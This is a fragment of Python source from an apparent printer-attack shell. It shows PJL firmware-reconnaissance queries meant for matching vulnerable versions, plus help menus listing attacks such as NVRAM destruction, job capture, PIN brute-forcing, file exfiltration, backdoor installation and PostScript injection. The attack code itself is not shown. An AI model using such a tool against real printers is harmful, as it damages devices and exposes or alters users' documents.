        # Query various firmware-related info
        queries = [
            ("@PJL INFO CONFIG", "Firmware Configuration"),
            ("@PJL INFO PRODUCT", "Product Information"),
            ("@PJL INFO ID", "Device ID"),
            ("@PJL DINQUIRE FWDATECODE", "Firmware Date Code"),
        ]
        
        for query, desc in queries:
            print("=" * 70)
            print(desc)
            print("=" * 70)
            result = self.cmd(query)
            if result:
                print(result)
            print()
    
    def help_firmware_info(self):
        """Get firmware information"""
        print()
        print("firmware_info - Get detailed firmware information")
        print("=" * 70)
        print("DESCRIPTION:")
        print("  Queries detailed firmware information including:")
        print("  - Firmware version")
        print("  - Firmware date code")
        print("  - Product information")
        print("  - Device configuration")
        print()
        print("USAGE:")
        print("  firmware_info")
        print()
        print("NOTES:")
        print("  - Useful for CVE identification")
        print("  - Helps determine vulnerable firmware versions")
        print()
    
    # Update help categories
    def help_attacks(self):
        """Show help for attack commands"""
        print()
        print("Attack Commands:")
        print("=" * 70)
        print("💥 DoS Attacks:")
        print("  destroy        - Cause physical damage to NVRAM")
        print("  flood          - Buffer overflow attack")
        print("  hold           - Enable job retention")
        print("  format         - Format filesystem")
        print("  hang           - Hang/crash printer")
        print("  dos_connections - DoS via connection flooding")
        print("  dos_display    - DoS via display spam")
        print("  dos_jobs       - DoS via job flooding")
        print("  paper_jam      - Attempt to cause paper jam")
        print()
        print("🎯 Job Manipulation:")
        print("  capture        - Capture retained print jobs")
        print("  overlay        - Overlay attack (watermark)")
        print("  overlay_remove - Remove overlay attack")
        print("  cross          - Cross-site printing")
        print("  replace        - Replace entire job content")
        print()
        print("🔓 Advanced Attacks:")
        print("  unlock_bruteforce - Brute force PIN")
        print("  exfiltrate     - Auto-exfiltrate sensitive files")
        print("  backdoor       - Install persistent backdoor")
        print("  backdoor_remove - Remove backdoor")
        print("  poison         - Configuration poisoning")
        print("  traverse       - Path traversal testing")
        print("  ps_inject      - PostScript code injection")
        print()
    
    def help_information(self):
        """Show help for information gathering commands"""
        print()
        print("Information Gathering Commands:")
        print("=" * 70)
        print("  info           - Comprehensive INFO queries")
        print("  scan_volumes   - Scan all volumes")
        print("  firmware_info  - Detailed firmware information")
        print("  id             - Printer identification")
        print("  variables      - Environment variables")
        print("  printenv       - Specific variable")
        print("  network        - Network information")
        print("  nvram          - NVRAM access")
        print()